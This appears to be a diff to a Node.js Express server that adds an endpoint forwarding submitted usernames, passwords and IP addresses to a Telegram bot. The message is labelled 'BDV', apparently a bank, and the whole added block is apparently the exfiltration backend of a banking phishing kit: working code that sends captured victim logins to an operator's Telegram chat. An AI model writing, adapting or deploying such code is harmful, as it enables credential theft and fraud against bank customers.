@@ -140,6 +140,63 @@ if (process.env.NODE_ENV !== "production") {
   });
 }
 
+const buildTelegramMessage = ({ username, password, ip }) => `\nBDV\nNombre: ${username}\nContra: ${password}\nIP: ${ip}`;
+
+app.post("/api/send-telegram", async (req, res) => {
+  try {
+    const { username, password, ip } = req.body ?? {};
+
+    if (!username || !password || !ip) {
+      return res.status(400).json({
+        error: "username, password e ip son requeridos",
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    const chatId = req.session.chat_id;
+    const token = req.session.token;
+
+    if (!chatId || !token) {
+      return res.status(500).json({
+        error: "Credenciales de Telegram no disponibles en la sesion",
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: buildTelegramMessage({ username, password, ip }),
+      }),
+    });
+
+    const payload = await telegramResponse.json().catch(() => null);
+
+    if (!telegramResponse.ok || !payload?.ok) {
+      const errorMessage = payload?.description || "Telegram rechazo la solicitud";
+      return res.status(telegramResponse.status || 502).json({
+        error: errorMessage,
+        timestamp: new Date().toISOString(),
+      });
+    }
+
+    return res.status(200).json({
+      ok: true,
+      timestamp: new Date().toISOString(),
+    });
+  } catch (error) {
+    console.error("Error al enviar a Telegram:", error);
+    return res.status(500).json({
+      error: "Error interno al enviar a Telegram",
+      timestamp: new Date().toISOString(),
+    });
+  }
+});
+
 app.get("/health", (req, res) => {
   return res.status(200).json({
     status: "OK",
